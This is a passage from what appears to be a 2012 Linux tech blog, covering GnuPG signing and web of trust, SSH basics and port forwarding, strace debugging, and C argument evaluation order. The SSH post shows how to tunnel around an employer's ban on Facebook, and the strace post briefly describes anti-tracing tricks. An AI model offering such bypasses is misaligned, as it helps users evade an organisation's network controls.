iJwEAAECAAYFAlBR8D4ACgkQBukbhL2AbGHLcAQAs4ou17+K9X1SS3P19PlO8OLO
jLLPEWq3+I8cU0gAXtB4U5SoTs66ZhlHBUtwMCwnLv7HBSQVnkdiRoRrxS7wtw5E
DhDWoioc4ZpGsoRsohCsGATSftUv5JHOXEEKsuOZ1pU8Icv2YLcSs9x+mLhxkbCm
6worbXhtndC4Xm3YsWc=
=12ip
-----END PGP SIGNATURE-----</code></pre>
<p>Alice now sends me the two files: <code>message.asc</code> - message and <code>message.sig</code> - signature to prove her identity.</p>
<p>Decrypt the message from Alice:</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --output message_from_alice.txt --decrypt message.asc
gpg: encrypted with 1024-bit RSA key, ID 4255F703, created 2012-09-13
      &quot;Tiberiu (This is my PGP key) &lt;email@host.com&gt;&quot;
tibi@tbarbu-pc:~$ cat message_from_alice.txt
Hello Tiberiu</code></pre>
<p>How can I be sure this message comes from Alice? I have to import Alice’s public key. She previously sent me in an e-mail.</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --import alice.asc
gpg: key BD806C61: public key &quot;Alice &lt;alice@home.com&gt;&quot; imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)</code></pre>
<p>I can verify the authenticity of Alice’s message:</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --verify message.sig message_from_alice.txt
gpg: Signature made Thu 13 Sep 2012 05:48:55 PM EEST using RSA key ID BD806C61
gpg: Good signature from &quot;Alice &lt;alice@home.com&gt;&quot;</code></pre>
<p>If the verification fails, here is how it looks:</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --verify message.sig message_from_alice.txt
gpg: Signature made Thu 13 Sep 2012 05:39:58 PM EEST using RSA key ID BD806C61
gpg: BAD signature from &quot;Alice &lt;alice@home.com&gt;&quot;</code></pre>
<p>So what makes GnuPG differ from Digital Signing if both of them use the same algorithms, the same hash functions? Also I can not be sure that Alice’s public key is the real one. <a href="https://en.wikipedia.org/wiki/Web_of_trust">Web of trust</a> is the concept used in GnuPG. Here we do not need a centralized Certificate Authority (CA) because web of trust is a descentralized model where people trust each other (and their keys). You self-sign your documents, you are your own CA. You will be able to trust people you have met and also they have friends, thus you trust their friends. And so on. Think of a big community where people trust each other. The following picture will show you how this work.</p>
<p><img style="float:center" src="./images/web_of_trust.png" alt="Web of trust" width="625" height="578" /></p>
<p>How can you trust people and people trust you?</p>
<p>If I want to trust Bob because yesterday I went out to a party and interacted with new friends, then I ask Bob to share with me his public key. I import his key and check the fingerprint and UID, then I trust him signing his key:</p>
<pre><code>tibi@tbarbu-pc:~/.gnupg$ gpg --import bob.asc
gpg: key 8FA52AD1: public key &quot;Bob Michael &lt;bob@michael.com&gt;&quot; imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
tibi@tbarbu-pc:~$ gpg --edit-key bob@michael.com
gpg (GnuPG) 1.4.10; Copyright (C) 2008 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.


pub  1024R/8FA52AD1  created: 2012-09-13  expires: never       usage: SC
                     trust: unknown       validity: unknown
sub  1024R/2786E92D  created: 2012-09-13  expires: never       usage: E
[ unknown] (1). Bob Michael &lt;bob@michael.com&gt;

Command&gt; sign

pub  1024R/8FA52AD1  created: 2012-09-13  expires: never       usage: SC
                     trust: unknown       validity: unknown
 Primary key fingerprint: A2F8 0339 479B 6978 0516  9214 10AE FD14 8FA5 2AD1

     Bob Michael &lt;bob@michael.com&gt;

Are you sure that you want to sign this key with your
key &quot;Tiberiu (This is my GPG key) &lt;email@host.com&gt;&quot; (03384551)

Really sign? (y/N) y

Command&gt; quit
Save changes? (y/N) y
tibi@tbarbu-pc:~/.gnupg$ gpg --list-sigs
/space/home/tibi/.gnupg/pubring.gpg
-----------------------------------
pub   1024R/03384551 2012-09-13
uid                  Tiberiu (This is my GPG key) &lt;email@host.com&gt;
sig 3        E4EFB2B4 2012-09-13  Tiberiu (This is my GPG key) &lt;email@host.com&gt;
sub   1024R/28847259 2012-09-13
sig          E4EFB2B4 2012-09-13  Tiberiu (This is my GPG key) &lt;email@host.com&gt;

pub   1024R/8FA52AD1 2012-09-13
uid                  Bob Michael &lt;bob@michael.com&gt;
sig 3        8FA52AD1 2012-09-13  Bob Michael &lt;bob@michael.com&gt;
sig          ECB916DC 2012-09-13  Tiberiu (This is my GPG key) &lt;email@host.com&gt;
sub   1024R/2786E92D 2012-09-13
sig          8FA52AD1 2012-09-13  Bob Michael &lt;bob@michael.com&gt;</code></pre>
<p>After signing he only has to send his new signed key to all his friends or to a public server.</p>
<p>GnuPG also offer the possibility to send not only encrypted messages to our friends – because sometimes it is not a must to secure out communication –, but signed only. Though the message is clear, it should be signed to confirm the authentication feature provided by GPG. You must be sure that the receiver can trust the content and it comes from a reliable source. We can do this as follows:</p>
<pre><code>tibi@tbarbu-pc:~$ echo &quot;Hello world. This is a plaintext&quot; &gt; clear_message.txt
gpg --clearsign clear_message.txt</code></pre>
<p>A new file <code>clear_message.txt.asc</code> is created, containing the following:</p>
<pre><code>tibi@tbarbu-pc:~$ cat clear_message.txt.asc
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hello world. This is a plaintext
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)

iJwEAQECAAYFAlBW5u8ACgkQo0DCbuy5FtxmiAQApRWX9/D48NnX8OEVzf4rrCFw
agE5U/0MUyp5zLTU6o1pM3Oj5qDrJCeUjmHfworLFw/rGy5wcfU0S6plgWmvrZMZ
roT/qVfAyNwDijRZb/INy8UEBd9am+8LyCjC1pJgKv5HqBbvyDNYTcB/EBa2YjUU
5iP5s3AbfsA0Gb5by30=
=Mrjv
-----END PGP SIGNATURE-----</code></pre>
<p>As you can see the message is signed and the authenticity can be verified:</p>
<pre><code>alice@home:~$ gpg --verify clear_message.txt.asc
gpg: Signature made Mon 17 Sep 2012 12:01:35 PM EEST using RSA key ID ECB916DC
gpg: Good signature from &quot;Tiberiu (This is my GPG key) &lt;email@home.com&gt;&quot;</code></pre>
<p><a href="http://www.youtube.com/watch?v=gBzJGckMYO4">That’s all folks</a>. Thank you and I hope you find this guide useful.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./intro-to-ssh.html" title="Introduction to SSH">Introduction to SSH</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on September 10, 2012</span>
            by
            <span class="author">Silviu-Mihai Popescu</span>
            </span>

            <p>This is an article aiming to familiarize the reader with the features and benefits of using <a href="https://en.wikipedia.org/wiki/Secure_Shell" title="SSH">Secure Shell (SSH)</a>, particularly with the <a href="http://www.openssh.org/" title="OpenSSH">OpenSSH</a> implementation. SSH is an application level protocol used for secure data communication, whether that means remote shell access, command execution, file transfer and some other aspects described in this article. It was meant to be a replacement for existing insecure remote shell protocols such as <code>telnet</code>, <code>rsh</code> and <code>rexec</code> which send information in plaintext, including usernames and passwords.</p>
<p>SSH uses <a href="https://en.wikipedia.org/wiki/Public-key_cryptography" title="public-key cryptography">public-key cryptography</a> for authentication purposes. In short, this works like this: each user has a pair of keys, one public and one private. They are mathematically related, but it is computationally infeasible to derive one from the other. The public key is … well, public! Anyone can get that, and they would use it to encrypt messages. The private key, however, is (or should be) accessible only by the user, and used to decrypt incoming messages.</p>
<p>The two parties of a SSH communication are the server and the client. The server usually runs on port 22, but that is not a requirement, and the client will use a random available port on the client machine.</p>
<h3 id="setting-up-ssh">Setting up SSH</h3>
<p>The simplest way to install a SSH client is with your package manager. On Debian-based distros, it would be something like:</p>
<pre><code>$ sudo apt-get install openssh-client</code></pre>
<p>After that finishes, you can generate a pair of cryptographic keys using the command <code>ssh-keygen</code>:</p>
<pre><code>$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/silviu/.ssh/id_rsa): test
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in test.
Your public key has been saved in test.pub.
The key fingerprint is:
eb:8b:a9:c5:22:46:c8:36:d9:c1:40:67:e1:b3:ec:66 silviu@keter
The key's randomart image is:
+--[ RSA 2048]----+
|.o +.            |
|  *              |
|   =             |
|..+ +            |
|.=.+    S        |
|..o  .   .       |
|  oE. o .        |
| .o. o +         |
|    ..o o.       |
+-----------------+</code></pre>
<p>The lines ending in colon represent where you have to provide input. You may have noticed the word <code>passphrase</code>. This is used to lock the private key with a string that you choose. In order to use that key pair, the passphrase is provided and checked locally, not transmitted over the network. Please do not mistake this for the remote password.</p>
<p>The default size for the RSA key is 2048 bits. You can change this and other aspects by checking the manual page for <code>ssh-keygen</code>,</p>
<p>On the server you would install the <code>openssh-server</code> package:</p>
<pre><code>$ sudo apt-get install openssh-server</code></pre>
<p>Among other things, this should put a script in <code>/etc/init.d/ssh</code> and start the server. Depending on whether you distro uses <code>inittab</code> or <code>upstart</code>, you can check if the server is running with the following commands:</p>
<pre><code>$ /etc/init.d/ssh status
$ service ssh status</code></pre>
<p>You can start the server by passing <code>start</code> as the last argument in those commands, but you’d also need root access to do that.</p>
<p>And now you can test the installation from the client like this:</p>
<pre><code>$ ssh my_user@my.server.com</code></pre>
<p>By default, this will try to connect to the specified server on port 22, using the default key at <code>~/.ssh/id_rsa</code>. You can change this behaviour by a quick glance at the manual page. Also, if you specified a passphrase during the generation of the key, you will have to provide that and the remote password for the user you are trying to log on as. You can specify the IP instead of the DNS name for the server.</p>
<p>You can also run just one line of commands, such as:</p>
<pre><code>$ ssh my_user@my.server.com 'ls -la; apt-get moo'</code></pre>
<p>So this would be the basic usage of SSH. You can do a lot just with what is written up to this point, and you might be tempted to close the article and just get back to what you wanted to do in the first place. But seriously, you would be missing a lot of the cool stuff SSH can do. Just <a href="https://xkcd.com/365/" title="XKCD">bear with me for a moment</a> and you will end up being more productive with SSH.</p>
<h3 id="copying-files-remotely">Copying files remotely</h3>
<p>You can use <code>cat</code> and pipes to copy a file remotely:</p>
<pre><code>$ cat test.txt | ssh -e none user@host 'cat &gt; remote_test.txt'</code></pre>
<p>The <code>-e</code> option disables escape characters so that you can send any bytes that your file may contain. The rest is a trick: the output of the remote <code>cat</code> is redirected to a file, but the input comes from the output of the first half of the pipe, which is the contents of the file you want to transfer. Neat, right?</p>
<p>However, that solution is kind of tedious. Instead you would better use <code>scp</code>, which comes with the package:</p>
<pre><code>$ scp test.txt user@host:remote_test.txt</code></pre>
<p>Notice that colon after host because it is critical. If you did not want to rename the file you would have just used <code>user@host:</code>. The colon tells scp the destination is a remote location. Otherwise, you would just copy <code>test.txt</code> to a file named <code>user@host</code>.</p>
<p>Also, the path after the colon is relative to the home directory of the remote user.</p>
<p>There is also the <code>sftp</code> utility which provides a FTP-like interface.</p>
<h3 id="passwordless-authentication">Passwordless authentication</h3>
<p>So, up until now you have connected via SSH by providing your password, maybe even a passphrase. You can probably see by now that this is troublesome and can be a major drawback if you would like to make a script using SSH. How about we ditch that remote password?</p>
<p>To do this, you would basically need to append the contents of your public key to a file located at <code>~/.ssh/authorized_keys</code> on the server.</p>
<p>Luckily for you, most SSH packages provide an utility called <code>ssh-copy-id</code> that does just that. So you would just run:</p>
<pre><code>$ ssh-copy-id user@host</code></pre>
<p>Next time you will try to log on to that account, you will not be prompted for your password.</p>
<p>As an exercise, knowing what you have read thus far, figure out two more ways of achieving the same result, just in case you do not have <code>ssh-copy-id</code>.</p>
<h3 id="config-file">Config file</h3>
<p>If you are going to use SSH with several servers, with various settings and different key pairs you will soon have to enter something like this:</p>
<pre><code>$ ssh -i ~/.ssh/private_key_file10 -l user -p 2222 -o &quot;ForwardX11 yes&quot; the.mother.of.all.servers.com</code></pre>
<p>Now that is an extremely long and ugly line with no particular purpose but to illustrate the complexity of ssh commands. Some who have read the manual page know that X forwading can be achieved by passing <code>-X</code>.</p>
<p>Anyway, an initial approach to bypassing this issue is by using aliases of bash functions. But those are limited in functionality and basically you are just placing that ugly command somewhere else. Not cool, not cool.</p>
<p>You can put settings on your local computer in <code>~/.ssh/config</code>. The full list of options, and their possible values, is available via <code>man ssh_config</code>.</p>
<p>Here is a modified version of my config file, for security reasons:</p>
<pre><code>Host compilers
	User ubuntu
	Hostname ec2-50-17-91-154.compute-1.amazonaws.com
	IdentityFile /home/silviu/.ssh/amazon
Host *.cs.pub.ro
	User you_d_like_to_know
	IdentityFile /home/silviu/.ssh/cs
Host so2-lin
	User root
	Hostname 192.168.56.101
	PubkeyAuthentication no
Host so-lin
	User student
	Hostname 10,0.2,15
	PubkeyAuthentication no
Host ubuntu-dev
	User silviu
	Hostname 172.16.48.129
	PubkeyAuthentication no
Host github
	User git
	Hostname github.com
	PreferredAuthentications publickey
	IdentityFile ~/.ssh/github</code></pre>
<p>Now you could put all those options for that long command above in a organized manner, and it will work with all SSH-related utilities, even <code>scp</code>, with the options you specified:</p>
<pre><code>$ scp something mother:</code></pre>
<h3 id="local-port-forwarding">Local port forwarding</h3>
<p>Let’s assume that your employer has banned Facebook, so that people might actually do something useful.</p>
<p>Let’s also assume that you have a SSH server that you can reach and has no filtering for Facebook.</p>
<p>You could do something like this</p>
<pre><code>$ ssh your.server.com -L 80:facebook.com:80</code></pre>
<p>This achieves the following effect: any connection to port 80 on your machine is passed, via your remote machine, to port 80 on facebook.com, which is the standard port for HTTP. After that, set an entry matching facebook.com to 127.0.0.1 in <code>/etc/hosts</code> and procrastinate.</p>
<p>But first, take a moment to come up with a section in your config file that does this forwarding. (Hint: <code>LocalForward</code>)</p>
<h3 id="conclusions">Conclusions</h3>
<p>So now you have a set of things you could do with SSH that can make you be more productive (or not if you just read the last part). I hope you found the article useful.</p>
<p>If you want to know about more things you could do with SSH here is a list of terms you might want to search the web for: * SSH tunnels * SSH remote port forwarding * Set up a SOCKS proxy for Firefox with SSH * sshfs * SSH master sessions * ssh-agent and ssh-reagent</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./tracing-processes-for-fun-and-profit.html" title="Tracing processes for fun and profit">Tracing processes for fun and profit</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on August 18, 2012</span>
            by
            <span class="author">Mihai Maruseac</span>
            </span>

            <p>After talking about <a href="http://techblog.rosedu.org/valgrind-introduction.html" title="Valgrind introduction">Valgrind</a> and <a href="http://techblog.rosedu.org/gdb-a-basic-workflow.html" title="GDB - basic workflow">GDB</a>, it is time to present another useful program for developers and system administrators.</p>
<p>Often-overlooked, though common on most of the GNU/Linux systems, <code>strace</code> is a tool which traces system calls done by a process during its execution. However, this is only a simplistic point of view: using <code>strace</code>, you can filter by a group of system calls, you can profile your application from the syscalls point of view and you can trace signals sent to a process.</p>
<h3 id="simple-example">Simple Example</h3>
<p>The simplest possible use is of the form <code>strace command</code>. For example:</p>
<pre><code>$ strace ls
execve(&quot;/bin/ls&quot;, [&quot;ls&quot;], [/* 39 vars */]) = 0
brk(0)                                  = 0x92c000
...
access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
...
open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=130982, ...}) = 0
mmap(NULL, 130982, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fc4e95c2000
close(3)                                = 0
...
open(&quot;/lib/x86_64-linux-gnu/librt.so.1&quot;, O_RDONLY|O_CLOEXEC) = 3
read(3, &quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\340!\0\0\0\0\0\0&quot;..., 832) = 832
...
openat(AT_FDCWD, &quot;.&quot;, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC) = 3
getdents(3, /* 25 entries */, 32768)    = 880
getdents(3, /* 0 entries */, 32768)     = 0
close(3)                                = 0
...
write(1, &quot;1.c git&quot;..., 1221.c gitignore....
) = 122
...
exit_group(0)                           = ?</code></pre>
<p>In the above trace we have removed some of the lines to keep the output within reasonable limits. We have kept some relevant outputs, though.</p>
<p>From the above output we can observe how a process is started (first group) or ended (last group), how libraries and system options are read (second, third and fourth section), how directory entries are read (fifth section) and how the output is written to the output (sixth section).</p>
<p>As you can see, each line presents a syscall, giving information about all parameters and the return value of the call.</p>
<h3 id="how-is-this-useful">How Is This Useful?</h3>
<p>Only by looking at the output lines, can we quickly find out why our process doesn’t behave as expected or what it does behind the scenes. Let us see some examples.</p>
<p>First, consider a binary which takes too long to finish. Using <code>strace</code> we get this as the last few lines:</p>
<pre><code>read(3, &quot;\333\310'\16\\\363&lt;\244u\324&quot;, 4096) = 10
read(3, </code></pre>
<p>We see that the application stopped while trying to read data from the third file descriptor. Looking backwards we find:</p>
<pre><code>open(&quot;/dev/random&quot;, O_RDONLY)           = 3</code></pre>
<p>Using these clues, we can construct a new source file which will compile into an application which has the exact same bug and nothing more:</p>
<p>{% highlight cpp %} #include <stdio.h> #include <stdlib.h></p>
<h1 id="define-size-1000">define SIZE 1000</h1>
<p>int main () { char a[SIZE]; FILE *f = fopen(“/dev/random”, “r”); fgets(a, SIZE, f); return 0; } {% endhighlight %}</p>
<p>Of course, the building of a new application is not always needed. In our case, we see that we are reading from <code>dev/random</code>. Knowing that this requires entropy sources to generate the random stream, we understand why the process stopped. Changing the file to <code>dev/urandom</code> solves the bug for our toy application, therefore it must solve it for the original one as well. Or, we could generate more entropy to increase the speed of the application.</p>
<p>For the second example, let’s consider the problem of finding which configuration files are read when launching an application. This can be used to debug a faulty <code>vim</code> setting, to see what <code>*rc</code> files are read when launching <code>bash</code>, etc. In our case, we want to see the order in which <code>git</code> reads its configuration files to see what files are to be ignored from the repository (we have 4 options: global <code>.gitignore</code>, <code>.gitignore</code> in root folder or in a subdirectory and <code>.git/info/exclude</code>):</p>
<pre><code>$strace git status
...
access(&quot;.git/info/exclude&quot;, R_OK)       = 0
open(&quot;.git/info/exclude&quot;, O_RDONLY)     = 3
...
access(&quot;/home/mihai/.gitignore&quot;, R_OK)  = 0
open(&quot;/home/mihai/.gitignore&quot;, O_RDONLY) = 3
...
open(&quot;.gitignore&quot;, O_RDONLY)            = 4
...
open(&quot;tag/.gitignore&quot;, O_RDONLY)        = -1 ENOENT (No such file or directory)
...
open(&quot;_includes/.gitignore&quot;, O_RDONLY)  = -1 ENOENT (No such file or directory)
...
open(&quot;_layouts/.gitignore&quot;, O_RDONLY)   = -1 ENOENT (No such file or directory)
...</code></pre>
<p>Observer the multiple lines with error <code>-ENOENT</code>. Those files don’t exist in the filesystem. The fact that we can quickly observe this makes <code>strace</code> a perfect tool for finding out why a specific command doesn’t start anymore.</p>
<h3 id="too-much-output">Too Much Output</h3>
<p>A problem with the simplest case is that we get too much output and scanning through it takes a long time while also being error prone.</p>
<p>Fortunately, once we know what to look for, we can select only a group of system calls to be traced.</p>
<pre><code>$ strace -e openat,getdents ls
openat(AT_FDCWD, &quot;.&quot;, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC) = 3
getdents(3, /* 9 entries */, 32768)     = 256
getdents(3, /* 0 entries */, 32768)     = 0</code></pre>
<p>Here, we have traced only the <code>openat</code> and <code>getdents</code> system calls of the <code>ls</code> command.</p>
<p>Moreover, we can save the trace to a file for further analyzing.</p>
<pre><code>$ strace -o trace ls
$ wc -l trace
117 trace
$ head trace -n 3
execve(&quot;/bin/ls&quot;, [&quot;ls&quot;], [/* 39 vars */]) = 0
brk(0)                                  = 0xced000
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</code></pre>
<p>Combining these two options lets you use the output of <code>strace</code> as input to other tools like <code>sed</code>, <code>awk</code>, <code>grep</code>, etc. This way, you can quickly determine what went wrong in your application.</p>
<h3 id="but-i-have-started-the-process..">But I Have Started The Process..</h3>
<p>Let’s consider another scenario. You have started a process and it is taking too much time to finish. You want to find out what it is doing right now. Restarting the process is not an option. Luckily, <code>strace</code> allows attaching to a running process:</p>
<pre><code>$ strace -p 5545
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
nanosleep({5, 0},</code></pre>
<p>The last argument is the process id of the faulty process.</p>
<h3 id="could-i-sniff-private-data-this-way">Could I Sniff Private Data This Way?</h3>
<p>This quickly raises a concern: couldn’t an attacker use <code>strace</code> over an existing <code>ssh</code> connection in order to make a Man In The Middle attack?</p>
<p>Actually, no. If the programmer behind <code>ssh</code> used the <code>prctl</code> system call disabling <code>PR_SET_DUMPABLE</code> (the capability to create crash dumps and to be traced), then only the superuser could trace the process.</p>
<p>In fact, some systems have gone a step further. Starting 2010, there is a Yama Linux Security Module. This includes a protection for ptrace. Having <code>1</code> in the <code>/proc/sys/kernel/yama/ptrace_scope</code> associated procfs file means that tracing is only possible only for children of the tracing process.</p>
<h3 id="what-about-subprocesses">What About Subprocesses?</h3>
<p>It is possible to trace subprocesses of an application by using the <code>-f</code> or <code>-ff</code> flag (the second one is used in conjuction with <code>-o</code> and creates one output file per each subprocess).</p>
<pre><code>$ strace -f ./a.out 
...
clone(Process 6187 attached
child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f9de09ee9d0) = 6187
[pid  6186] wait4(6187, Process 6186 suspended
 &lt;unfinished ...&gt;
[pid  6187] rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
[pid  6187] rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
[pid  6187] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
[pid  6187] nanosleep({1, 0}, 0x7fff306a3cf0) = 0
[pid  6187] exit_group(0)               = ?
Process 6186 resumed
Process 6187 detached
&lt;... wait4 resumed&gt; [{WIFEXITED(s) &amp;&amp; WEXITSTATUS(s) == 0}], 0, NULL) =
6187
--- SIGCHLD (Child exited) @ 0 (0) ---
exit_group(0)                           = ?</code></pre>
<p>When tracing multiple processes, the PID of the process making a system call is written on the respective line. The tracing of a child starts as soon as it’s PID is returned to the parent (as a result of the <code>clone</code> system call).</p>
<h3 id="profiling-with-strace">Profiling With <code>strace</code></h3>
<p>Another thing that <code>strace</code> can do is help in profiling the application, considering the number of system calls. This could be useful, for example, to optimize the I/O calls done by the application.</p>
<pre><code>$ strace -c firefox
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 99.50    0.012001        1091        11           readahead
  0.31    0.000037           0      1456       972 recvfrom
  0.19    0.000023           0       963           poll
  0.00    0.000000           0       123           read
  0.00    0.000000           0       134        33 open
  0.00    0.000000           0       107           close
  0.00    0.000000           0         8         3 stat
  0.00    0.000000           0        87           fstat
  0.00    0.000000           0        16           lstat
  0.00    0.000000           0         8           lseek
  0.00    0.000000           0       189           mmap
  0.00    0.000000           0       148           mprotect
  0.00    0.000000           0        20           munmap
  0.00    0.000000           0         4           brk
  0.00    0.000000           0        17           rt_sigaction
  0.00    0.000000           0         1           rt_sigprocmask
  ....    ........           .       ...           ................
------ ----------- ----------- --------- --------- ----------------
100.00    0.012061                  3900      1079 total</code></pre>
<h3 id="but-i-dont-want-to-be-traced..">But I Don’t Want To Be Traced..</h3>
<p>In the end, let’s consider the case of an application which should be designed as untraceable as possible.</p>
<p>We already know how to prevent attaching from the outside of the process. If we want to also deny root tracing and starting the process under <code>strace</code> then we need to take some extra steps.</p>
<p>We know that each application can be under a single tracer. Thus, the obvious solution is to create a dummy tracer.</p>
<p>A better solution is to inspect whether the process is traced and act accordingly (exit forcibly, display dummy messages, etc.). To do this, you can either use the <code>ptrace</code> system call on top of which <code>strace</code> is implemented or use the <code>proc/[pid]/status</code> file, looking for <code>TracerPid</code>.</p>
<h3 id="conclusions">Conclusions</h3>
<p>The <code>strace</code> program is a good tool to have in your toolbox. Knowing how to use it will greatly improve your debugging experience.</p>
<p>However, using <code>strace</code> has some disadvantages as well. The traced process runs slower and each system call is done at least twice. You can also get a different behaviour while running a process under <code>strace</code>: either because some timing bugs will manifest, because some timeouts are reached or because someone has taken measures that the process cannot be properly traced.</p>
<p>In the end, remember that debugging doesn’t stop at <a href="http://techblog.rosedu.org/gdb-a-basic-workflow.html" title="GDB - basic workflow">GDB</a> and/or <a href="http://techblog.rosedu.org/valgrind-introduction.html" title="Valgrind introduction">Valgrind</a>. Beside <code>strace</code>, there is also <code>ltrace</code> for library calls and <code>perf</code> for profiling. These two tools will be presented in further articles.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./a-weird-behaviour-in-c.html" title="A Weird Behaviour Of C">A Weird Behaviour Of C</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on July 29, 2012</span>
            by
            <span class="author">Mihai Maruseac</span>
            </span>

            <p>Let us start from a common mistake made by programmers learning simple data structures in C. The following code is an implementation for simple linked lists of integers in C.</p>
<p>{% highlight cpp %} #include <stdio.h> #include <stdlib.h></p>
<p>struct queue { int elm; struct queue* next; };</p>
<p>struct queue* init() { struct queue <em>q = calloc(1, sizeof(</em>q)); q-&gt;next = q; return q; }</p>
<p>void add(struct queue <em>q, int x) { struct queue </em>n = calloc(1, sizeof(<em>n)); struct queue </em>head = q;</p>
<pre><code>n-&gt;elm = x;
n-&gt;next = head;
while (q-&gt;next != head)
	q = q-&gt;next;
q-&gt;next = n;</code></pre>
<p>}</p>
<p>int pop(struct queue <em>q) { int x = q-&gt;next-&gt;elm; struct queue </em>tmp = q-&gt;next; q-&gt;next = tmp-&gt;next; free(tmp); return x; }</p>
<p>void free_q(struct queue <em>q) { struct queue </em>tmp; while (q-&gt;next != q) { tmp = q-&gt;next; free(q); q = tmp; } free(q); }</p>
<p>int main() { struct queue *q = init(); add(q, 4); add(q, 2); printf(“%d%d”, pop(q), pop(q)); free_q(q); return 0; } {% endhighlight %}</p>
<p>The idea is simple: we insert <code>4</code> and <code>2</code> into the queue and expect the output to be <code>42</code>, the digits being output in the order of their insertion into the queue.</p>
<p>However, running the program, we have a big surprise:</p>
<pre><code>$ gcc -Wall -Wextra 1.c -g -o 1-gcc
$ clang -Wall -Wextra 1.c -g -o 1-clang
$ ./1-gcc 
24
$ ./1-clang 
42</code></pre>
<p>Let’s ignore for now the fact that <a href="http://clang.llvm.org/" title="clang">clang</a> gives the correct response and let’s answer this question: What went wrong? The queue implementation seems correct but let’s replace it by a dummy implementation:</p>
<p>{% highlight cpp %} #include <stdio.h> #include <stdlib.h></p>
<p>int x;</p>
<p>int inc() { x++; return x; }</p>
<p>int dec() { x–; return x; }</p>
<p>int main() { inc(); inc(); printf(“%d%d”, dec(), dec()); return 0; } {% endhighlight %}</p>
<p>Basically, we have removed the queue and replaced it by it’s length, stored in the global <code>x</code> variable. The expected output is <code>10</code>.</p>
<pre><code>$ clang -Wall -Wextra 2.c -g -o 2-clang
$ gcc -Wall -Wextra 2.c -g -o 2-gcc
$ ./2-gcc 
01
$ ./2-clang 
10</code></pre>
<p>The output is consistent with the above example. Thus, the problem is not in our queue implementation. It must be somewhere else.</p>
<p>Before starting to shout that <code>printf</code> or <code>gcc</code> or <code>clang</code> is buggy, let us read <a href="http://www.open-std.org/jtc1/sc22/wg14/www/standards" title="C standards">the C standard</a>:</p>
<blockquote>
<p><strong>unspecified behavior</strong>: use of an unspecified value, or other behavior where this International Standard provides two or more possibilities and imposes no further requirements on which is chosen in any instance</p>
<p><strong>EXAMPLE</strong> An example of unspecified behavior is the order in which the arguments to a function are evaluated.</p>
</blockquote>
<p>This explains why the two compilers were allowed to give different results, while being both correct.</p>
<p>If we want more informations, we can compare the generated assembly code of the two compilers. The <code>gcc</code> version is below (only the relevant snippet):</p>
<pre><code>call    inc
movl    $0, %eax
call    inc
movl    $0, %eax
call    dec
movl    %eax, %ebx
movl    $0, %eax
call    dec
movl    %eax, %ecx
movl    $.LC0, %eax
movl    %ebx, %edx
movl    %ecx, %esi
movq    %rax, %rdi
movl    $0, %eax
call    printf</code></pre>
<p>For comparation, the <code>clang</code> version is:</p>
<pre><code>callq   inc
movl    %eax, -8(%rbp)          # 4-byte Spill
callq   inc
movl    %eax, -12(%rbp)         # 4-byte Spill
callq   dec
movl    %eax, -16(%rbp)         # 4-byte Spill
callq   dec
leaq    .L.str, %rdi
movl    -16(%rbp), %esi         # 4-byte Reload
movl    %eax, %edx
movb    $0, %al
callq   printf</code></pre>
<p>The understanding of the assembly code is left as an exercise to the reader. It is easy to see that <code>clang</code> uses the stack to store the results.</p>
<p>Both snippets were obtained using no optimization. As an exercise, try to observe the effect of each optimization level on the generated code and explain it.</p>
